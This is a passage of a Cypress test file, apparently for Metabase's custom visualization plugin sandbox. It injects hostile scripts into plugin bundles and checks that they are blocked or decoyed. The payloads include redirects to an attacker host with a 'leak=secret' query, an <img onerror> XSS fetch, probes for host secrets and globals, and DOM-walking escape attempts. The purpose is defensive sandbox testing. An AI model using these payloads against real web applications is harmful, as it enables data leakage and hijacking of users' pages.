  // the comment in distortions-blocked-apis.ts). What we *can*  verify is that the host page is intact.
  it("plugin location operations do not navigate the host", () => {
    const payloads = [
      'location.href = "https://attacker.example/?leak=secret";',
      'location.assign("https://attacker.example/");',
      'location.replace("https://attacker.example/");',
      'window.location = "https://attacker.example/";',
      'location.pathname = "/attacker-pwned";',
      'location.search = "?attacker-pwned=1";',
      'location.hash = "#attacker-pwned";',
    ];
    // Run inline in the bundle preamble. Each is wrapped in try/catch so an
    // attempt that errors doesn't short-circuit the rest, and logs whether it
    // ran to the end or threw.
    const attackBundle = payloads
      .map(
        (p, index) =>
          `try { ${p}; console.log("plugin location op", ${index}, "ran"); } catch (e) { console.log("plugin location op", ${index}, "threw"); }`,
      )
      .join("\n");

    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
      req.continue((res) => {
        res.body = `${attackBundle}\n${String(res.body)};\n`;
        res.send();
      });
    }).as("injectedBundle");

    H.visitQuestion("@sandboxCardId", {
      onBeforeLoad(win) {
        cy.spy(win.console, "log").as("consoleLog");
      },
    });
    cy.wait("@injectedBundle");

    cy.findByRole("heading", {
      name: "Custom viz rendered successfully",
    }).should("be.visible");
    payloads.forEach((_payload, index) => {
      cy.get("@consoleLog").should(
        "have.been.calledWith",
        "plugin location op",
        index,
      );
    });

    cy.location("pathname").should("match", /\/question/);
    cy.location("href").should("not.include", "attacker");
    cy.location("search").should("not.contain", "attacker-pwned");
    cy.location("hash").should("not.contain", "attacker-pwned");
  });

  // innerHTML/outerHTML/insertAdjacentHTML go through DOMPurify rather than
  // being blocked outright, so these cases don't fit the "expect a thrown
  // error" shape of SANDBOX_CASES. Instead we inject an <img onerror> — which
  // the browser would execute in the host realm if it survived assignment —
  // and confirm DOMPurify stripped it by checking the onerror's side effect
  // (a fetch to the canary URL) never happens.
  //
  // Host-app globals: direct access is closed by near-membrane-dom's default
  // behavior: it remaps only the own keys of a fresh sandbox iframe's window
  // from host to plugin.
  //
  // Each payload runs in its own function scope, logs distinct messages and
  // touches a fresh decoy, so they share one page load.
  it("sanitizes HTML, hides host globals and returns decoys for out-of-scope DOM access", () => {
    const hostSelector = "#root";
    const preamble = `
      (function() {
        var d = document.createElement('div');
        d.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
        document.body.appendChild(d);
      })();
      (function() {
        var host = document.createElement('div');
        var shadow = host.attachShadow({ mode: 'open' });
        shadow.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
        document.body.appendChild(host);
      })();
      (function() {
        var hostEl = document.querySelector('${hostSelector}');
        if (hostEl) {
          const elementId = hostEl.getAttribute("id");
          hostEl.setAttribute('data-pwned-by-plugin', 'true');
          console.log('plugin read element id', elementId);
          console.log('plugin saw decoy', hostEl.getAttribute('data-plugin-sandbox-decoy'));
        } else {
          console.log('plugin-saw-decoy', false);
        }
      })();
      setTimeout(function() {
        console.log("plugin sees MetabaseBootstrap:", typeof window.MetabaseBootstrap);
        try {
          console.log(
            "plugin sees parent.MetabaseBootstrap:",
            typeof (window.parent && window.parent.MetabaseBootstrap)
          );
        } catch (e) {
          console.log("plugin sees parent.MetabaseBootstrap:", "throws");
        }

        try {
          console.log(
            "plugin sees defaultView.MetabaseBootstrap:",
            typeof (document.defaultView && document.defaultView.MetabaseBootstrap)
          );
        } catch (e) {
          console.log("plugin sees defaultView.MetabaseBootstrap:", "throws");
        }
        console.log("plugin sees MetabaseUserLocalization:", typeof window.MetabaseUserLocalization);
        console.log("plugin sees MetabaseSiteLocalization:", typeof window.MetabaseSiteLocalization);
        console.log("plugin sees SECRET:", typeof window.SECRET);
      }, 500);
    `;
    // Runs after the bundle so the plugin container exists.
    const epilogue = `
      setTimeout(function() {
        var container = document.querySelector('[data-plugin-sandbox]');
        if (!container) {
          console.log('plugin parent test:', 'no container');
          return;
        }
        const { parentElement, parentNode} = container;
        console.log('plugin parentElement decoy:', parentElement && parentElement.getAttribute('data-plugin-sandbox-decoy'));
        console.log('plugin parentElement id:', parentElement && parentElement.getAttribute('id'));
        console.log('plugin parentNode decoy:', parentNode && parentNode.getAttribute && parentNode.getAttribute('data-plugin-sandbox-decoy'));
        if (parentElement) {
          parentElement.setAttribute('data-pwned-by-plugin', 'true');
        }
      }, 1000);
    `;

    cy.intercept("GET", "/api/canary-should-be-blocked-by-sandbox").as(
      "canary",
    );
    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
      req.continue((res) => {
        res.body = `${preamble}\n${String(res.body)};\n${epilogue}`;
        res.send();
      });
    }).as("injectedBundle");

    H.visitQuestion("@sandboxCardId", {
      onBeforeLoad(win) {
        cy.spy(win.console, "log").as("consoleLog");
        cy.spy(win.console, "error").as("consoleError");
        // @ts-expect-error - test window property
        win.SECRET = "abracadabra";
      },
    });
    cy.wait("@injectedBundle");

    // Viz still renders — sanitization mutates the HTML but doesn't throw.
    cy.findByRole("heading", {
      name: "Custom viz rendered successfully",
    }).should("be.visible");

    cy.log("DOMPurify strips the onerror handler");
    cy.get("@consoleError").should(
      "have.been.calledWithMatch",
      /\[plugin \d+\] DOMPurify stripped content from innerHTML/,
    );
    cy.get("@consoleError").should(
      "have.been.calledWithMatch",
      /\[plugin \d+\] DOMPurify stripped content from ShadowRoot\.innerHTML/,
    );
    cy.get("@canary.all").should("have.length", 0);

    cy.log("The host realm has these globals, the plugin does not");
    cy.window().its("SECRET").should("eq", "abracadabra");
    cy.window().its("MetabaseBootstrap").should("exist");
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees SECRET:",
      "undefined",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees MetabaseBootstrap:",
      "undefined",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees parent.MetabaseBootstrap:",
      "undefined",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees defaultView.MetabaseBootstrap:",
      "undefined",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees MetabaseUserLocalization:",
      "undefined",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin sees MetabaseSiteLocalization:",
      "undefined",
    );

    cy.log(
      "The plugin reached for #root but received a decoy with data-plugin-sandbox-decoy=true",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin saw decoy",
      "true",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin read element id",
      "sandbox-decoy",
    );
    cy.get(hostSelector).should("not.have.attr", "data-pwned-by-plugin");

    cy.log(
      "The plugin walked up to its container's parentElement/parentNode and received a decoy",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin parentElement decoy:",
      "true",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin parentElement id:",
      "sandbox-decoy",
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin parentNode decoy:",
      "true",
    );
    cy.get("[data-plugin-sandbox]")
      .parent()
      .should("not.have.attr", "data-pwned-by-plugin");
  });

  // `Document` is itself a Node, so it's a valid root for TreeWalker /
  // NodeIterator and a valid target for `MutationObserver.observe`. With
  // an Element-only decoy, the plugin could pass `document` as the root
  // and walk the entire host DOM, surfacing real host Text nodes that
  // weren't decoyed. Locking this down requires the Node-level decoy.
  it("decoys non-Element nodes reached via TreeWalker rooted at document, and observes a decoy with MutationObserver on out-of-scope nodes", () => {
    const HOST_MARKER_TEXT = "treewalker-host-canary-do-not-leak";

    const payload = `
      setTimeout(function() {
        var walker = document.createTreeWalker(document, NodeFilter.SHOW_TEXT);
        var sawMarker = false;
        var node;
        let nonEmptyCount = 0;
        while ((node = walker.nextNode())) {
          if ((node.textContent || "").indexOf(${JSON.stringify(HOST_MARKER_TEXT)}) !== -1) {
            sawMarker = true;
            break;
          }
          if (node.textContent && node.textContent.trim() !== "") {
            nonEmptyCount++;
          }
        }
        console.log('plugin treewalker(document) saw host marker:', sawMarker);
        console.log('plugin treewalker(document) saw non-empty nodes:', nonEmptyCount);
      }, 1500);
      (function() {
        var seenMutations = 0;
        var observer = new MutationObserver(function(records) {
          seenMutations += records.length;
        });
        observer.observe(document.body, {
          childList: true,
          subtree: true,
          attributes: true,
        });
        var ownMutations = 0;
        var ownNode = document.createElement('div');
        new MutationObserver(function(records) {
          ownMutations += records.length;
        }).observe(ownNode, { attributes: true });
        ownNode.setAttribute('data-own-mutation', 'true');
        setTimeout(function() {
          console.log('plugin observed own mutations:', ownMutations);
          console.log('plugin observed mutations:', seenMutations);
        }, 1500);
      })();
    `;

    cy.intercept("GET", "/api/ee/custom-viz-plugin/*/bundle*", (req) => {
      req.continue((res) => {
        res.body = `${payload}\n${String(res.body)};\n`;
        res.send();
      });
    }).as("injectedBundle");

    H.visitQuestion("@sandboxCardId", {
      onBeforeLoad(win) {
        cy.spy(win.console, "log").as("consoleLog");
        // DOMContentLoaded fires before the plugin bundle loads, so the marker
        // is in the host DOM before the walker runs. The host keeps mutating
        // the real DOM while the plugin observer is active. If the plugin held
        // a real reference to document.body, these mutations would fire its
        // observer.
        win.document.addEventListener("DOMContentLoaded", () => {
          const marker = win.document.createElement("span");
          marker.id = "treewalker-host-marker";
          marker.textContent = HOST_MARKER_TEXT;
          win.document.body.appendChild(marker);

          const probe = win.document.createElement("div");
          win.document.body.appendChild(probe);
          win.setInterval(() => {
            probe.toggleAttribute("data-mutation-probe");
            win.document.body.toggleAttribute("data-mutation-probe-attr");
          }, 100);
        });
      },
    });
    cy.wait("@injectedBundle");

    cy.get("#treewalker-host-marker").should("have.text", HOST_MARKER_TEXT);
    cy.findByRole("heading", {
      name: "Custom viz rendered successfully",
    }).should("be.visible");

    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin treewalker(document) saw host marker:",
      false,
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin treewalker(document) saw non-empty nodes:",
      27,
    );

    // The membrane swapped body for a detached decoy, so observation is
    // wired to a node that never sees host changes.
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin observed own mutations:",
      1,
    );
    cy.get("@consoleLog").should(
      "have.been.calledWith",
      "plugin observed mutations:",
      0,
    );
  });

  it("blocks forbidden apis in widget settings and sandboxes React component setting widgets", () => {
    H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_3_SECURITY);
    H.addCustomVizPlugin(H.CUSTOM_VIZ_FIXTURE_TGZ_4_SECURITY_COMPONENT);

    H.createQuestion(
      {
        name: "Custom Viz Question Test",
        query: {
          "source-table": SAMPLE_DB_TABLES.STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: "table",
      },
      { wrapId: true, idAlias: "questionId" },
    );

    H.visitQuestion("@questionId", {
      onBeforeLoad(win) {
        cy.spy(win.console, "error").as("consoleError");
      },
    });

    cy.findByTestId("viz-type-button").click();
    cy.findByTestId("custom-viz-plugins-toggle").click();
    cy.findByTestId(`${H.CUSTOM_VIZ_IDENTIFIER_3_SECURITY}-button`).click();
    cy.findByTestId("viz-type-button").click();

    cy.log("open viz settings");
    cy.findByTestId("viz-settings-button").click();

    cy.get("@consoleError").should(
      "have.been.calledWithMatch",
      Cypress.sinon.match.has(
        "message",
        Cypress.sinon.match(/blocked API call: window\.fetch/),
      ),
    );

    cy.log(
      "Switch to the component widget plugin; the custom viz group is already expanded",
    );
    cy.findByTestId("viz-type-button").click();
    cy.findByTestId(
      `${H.CUSTOM_VIZ_IDENTIFIER_4_SECURITY_COMPONENT}-button`,
    ).click();
    cy.findByTestId("viz-type-button").click();

    cy.log("open viz settings to mount the custom component widget");
    cy.findByTestId("viz-settings-button").click();

    cy.log("the sandbox blocks the component's forbidden <input> element");
    cy.get("@consoleError").should(
      "have.been.calledWithMatch",
      /render failed: \[plugin \d+\] blocked createElement: input/,
    );
  });
});
